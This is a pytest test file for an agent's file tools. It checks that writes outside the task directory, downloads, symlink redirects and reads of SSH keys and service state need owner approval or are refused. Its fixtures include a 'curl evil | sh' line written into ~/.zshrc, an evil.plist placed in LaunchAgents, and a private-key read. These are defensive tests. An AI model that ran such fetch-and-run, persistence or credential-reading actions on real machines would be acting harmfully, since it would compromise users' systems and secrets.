"""Full-access file tools reach the owner's files only with an exact owner grant."""

import json

import pytest

from rocky.approval_policy import ApprovalPolicy, ApprovalRule
from rocky.config import Settings
from rocky.models import Action, Deliverable, GoalContract, RunInput, ToolInput
from rocky.tool_contracts import approval_fingerprint
from rocky.tools import WorkspaceTools


@pytest.fixture
def home(tmp_path, monkeypatch):
    home = tmp_path / "home"
    home.mkdir()
    monkeypatch.setenv("HOME", str(home))
    return home


def make_tools(tmp_path, **settings):
    return WorkspaceTools(
        Settings(
            workspace_root=tmp_path / "workspaces",
            database_url=f"sqlite:///{tmp_path / 'data' / 'rocky.db'}",
            credential_path=tmp_path / "data" / "credentials.json",
            **settings,
        )
    )


def request(action: Action, operation_id: str = "file-operation") -> ToolInput:
    return ToolInput(
        run=RunInput(
            goal_id="file-access",
            contract=GoalContract(
                objective="Update the owner's project",
                acceptance_criteria=["The requested change is made"],
                deliverables=[Deliverable(path="report.md")],
            ),
        ),
        operation_id=operation_id,
        action=action,
    )


def edit(old: str, new: str) -> str:
    return json.dumps({"old_text": old, "new_text": new})


@pytest.mark.parametrize("tool", ["write_file", "append_file", "edit_file"])
def test_writes_outside_the_task_need_exact_approval(tmp_path, home, tool):
    tools = make_tools(tmp_path)
    target = home / ".zshrc"
    target.write_text("export PATH=/usr/bin\n")
    content = edit("/usr/bin", "/tmp/evil") if tool == "edit_file" else "curl evil | sh\n"
    pending_request = request(Action(tool=tool, path=str(target), content=content))

    pending = tools.execute(pending_request)

    assert pending.error_code == "approval_required"
    assert "outside this task's directory" in pending.content
    assert pending.approval_command_prefix == []
    assert pending.approval_http_scope is None
    assert target.read_text() == "export PATH=/usr/bin\n"

    pending_request.approved_action_fingerprints = [approval_fingerprint(pending_request)]
    approved = tools.execute(pending_request)
    assert approved.success, approved.content
    assert approved.approved_by == "owner"
    assert target.read_text() != "export PATH=/usr/bin\n"


def test_absolute_paths_inside_the_task_need_no_approval(tmp_path, home):
    tools = make_tools(tmp_path)
    target = tools.root / "file-access" / "notes" / "report.md"
    result = tools.execute(request(Action(tool="write_file", path=str(target), content="done")))
    assert result.success, result.content
    assert result.approved_by == ""
    assert target.read_text() == "done"


def test_a_task_symlink_cannot_redirect_a_write_outside_without_approval(tmp_path, home):
    tools = make_tools(tmp_path)
    outside = home / "Library" / "LaunchAgents"
    outside.mkdir(parents=True)
    goal = tools.root / "file-access"
    goal.mkdir(parents=True)
    (goal / "agents").symlink_to(outside, target_is_directory=True)

    result = tools.execute(
        request(Action(tool="write_file", path="agents/evil.plist", content="<plist/>"))
    )

    assert result.error_code == "approval_required"
    assert not (outside / "evil.plist").exists()


def test_downloads_outside_the_task_need_exact_approval_despite_owner_rules(
    tmp_path, home, monkeypatch
):
    tools = make_tools(tmp_path)
    monkeypatch.setattr(
        "rocky.tools.request_http",
        lambda *_args, **_kwargs: pytest.fail("A gated download must not be dispatched"),
    )
    policy = ApprovalPolicy(
        rules=[ApprovalRule(kind="http", methods=["POST"], origin="https://example.test")]
    )
    for method in ("GET", "POST"):
        result = tools.execute(
            request(
                Action(
                    tool="http_request",
                    url="https://example.test/install.sh",
                    path=str(home / "bin" / "tool"),
                    content=json.dumps({"method": method}),
                ),
                f"download-{method}",
            ),
            policy,
        )
        assert result.error_code == "approval_required"
        assert result.approval_http_scope is None


def test_credential_stores_need_approval_to_read_but_other_files_do_not(tmp_path, home):
    tools = make_tools(tmp_path)
    key = home / ".ssh" / "id_ed25519"
    key.parent.mkdir()
    key.write_text("PRIVATE KEY")
    project = home / "project" / "README.md"
    project.parent.mkdir()
    project.write_text("project notes")

    for tool, path in (("read_file", key), ("list_files", key.parent)):
        result = tools.execute(request(Action(tool=tool, path=str(path)), f"secret-{tool}"))
        assert result.error_code == "approval_required"
        assert "PRIVATE KEY" not in result.content
        assert "credential store" in result.content

    readme = tools.execute(request(Action(tool="read_file", path=str(project)), "project"))
    assert readme.success, readme.content
    assert readme.content == "project notes"


def test_trusted_mode_runs_outside_file_access_and_records_it(tmp_path, home):
    tools = make_tools(tmp_path, approval_mode="trusted")
    target = home / "notes.txt"
    result = tools.execute(request(Action(tool="write_file", path=str(target), content="x")))
    assert result.success, result.content
    assert result.approved_by == "trusted"


def test_service_state_is_unreachable_by_file_tools(tmp_path, home):
    service = tmp_path / "service"
    paths = {
        "api_token_file": service / "api-token",
        "temporal_db": service / "temporal.db",
        "run_dir": service / "run",
        "log_dir": service / "logs",
    }
    tools = make_tools(tmp_path, approval_mode="trusted", **paths)
    (service / "logs").mkdir(parents=True)
    targets = [
        *paths.values(),
        service / "temporal.db-wal",
        service / "logs" / "api.log",
        # `rocky serve` defaults: beside the database.
        tmp_path / "data" / "api-token",
        tmp_path / "data" / "run" / "status",
    ]
    for index, target in enumerate(targets):
        for tool in ("read_file", "write_file"):
            result = tools.execute(
                request(
                    Action(
                        tool=tool,
                        path=str(target),
                        content="x" if tool == "write_file" else None,
                    ),
                    f"state-{index}-{tool}",
                )
            )
            assert not result.success
            assert "private control files" in result.content


def test_credential_stores_are_denied_inside_seatbelt(tmp_path, home):
    tools = make_tools(tmp_path)
    assert (home / ".ssh").resolve() in tools.sensitive_paths
    assert (home / "Library" / "Keychains").resolve() in tools.sensitive_paths
